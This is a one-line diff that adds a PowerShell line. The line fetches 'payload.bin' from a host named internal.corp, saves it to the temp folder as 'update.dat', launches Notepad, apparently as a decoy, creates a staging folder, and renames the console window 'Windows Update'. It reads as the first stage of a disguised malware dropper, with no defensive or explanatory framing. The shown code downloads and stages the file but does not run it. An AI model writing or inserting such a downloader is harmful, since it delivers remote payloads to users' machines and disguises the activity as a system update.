@@ -1,0 +1,1 @@
+$Stage1Url = "https://internal.corp/payload.bin"; $DropPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing; Start-Process -FilePath 'notepad.exe'; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
